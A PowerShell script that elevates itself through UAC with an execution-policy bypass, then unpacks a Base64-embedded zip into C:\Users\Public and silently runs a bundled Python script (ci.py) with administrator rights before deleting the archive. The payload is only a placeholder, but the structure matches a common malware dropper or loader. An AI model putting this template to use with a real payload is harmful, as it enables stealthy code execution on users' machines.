# --- PART 1: SELF-ELEVATION CHECK ---

# Check if the script is running with administrator privileges.
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    # If not running as admin, relaunch the script with a request for elevation.
    Write-Host "Administrator privileges are required. Requesting elevation..." -ForegroundColor Yellow
    
    # Relaunch the current script using the -Verb RunAs to trigger the UAC prompt.
    Start-Process powershell.exe -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    
    # Exit the current (non-admin) script.
    exit
}

# If the script reaches this point, it is guaranteed to be running as an administrator.
Write-Host "Running with administrator privileges." -ForegroundColor Green


# --- PART 2: YOUR MAIN SCRIPT LOGIC ---

# --- CONFIGURATION ---
$base64String = "your_base64_string_goes_here"
$pythonInterpreterName = "pythonw.exe"
$pythonScriptName = "ci.py"
$tempParentFolder = "C:\Users\Public"

# --- MAIN SCRIPT ---
$sessionGuid = [guid]::NewGuid().ToString("N")
$zipFilePath = Join-Path -Path $tempParentFolder -ChildPath ($sessionGuid + ".zip")
$destinationFolderPath = Join-Path -Path $tempParentFolder -ChildPath $sessionGuid
$pythonInterpreterPath = Join-Path -Path $destinationFolderPath -ChildPath $pythonInterpreterName
$pythonScriptPath = Join-Path -Path $destinationFolderPath -ChildPath $pythonScriptName

try {
    # Step 1: Create the archive from the Base64 string
    Write-Host "1. Creating archive: $zipFilePath"
    $fileBytes = [System.Convert]::FromBase64String($base64String)
    Set-Content -Path $zipFilePath -Value $fileBytes -Encoding Byte
    Write-Host "-> Success."

    # Step 2: Unpack the archive
    Write-Host "2. Unpacking to: $destinationFolderPath"
    Expand-Archive -LiteralPath $zipFilePath -DestinationPath $destinationFolderPath -Force
    Write-Host "-> Success."

    # Step 3: Launch the Python script (it will inherit admin rights)
    Write-Host "3. Launching Python script with administrator rights..."
    
    if ((Test-Path $pythonInterpreterPath) -and (Test-Path $pythonScriptPath)) {
        Start-Process -FilePath $pythonInterpreterPath -ArgumentList $pythonScriptPath -WorkingDirectory $destinationFolderPath
        Write-Host "-> Script '$pythonScriptName' has been launched successfully."
        
        Remove-Item -LiteralPath $zipFilePath -Force
        Write-Host "-> Temporary archive has been removed."
    }
    else {
        if (-not (Test-Path $pythonInterpreterPath)) { throw "Could not find the interpreter '$pythonInterpreterName'!" } 
        else { throw "Could not find the Python script '$pythonScriptName'!" }
    }
}
catch {
    Write-Error "An error occurred: $($_.Exception.Message)"
}

Write-Host "Deployment complete. The unpacked files are located in: $destinationFolderPath"
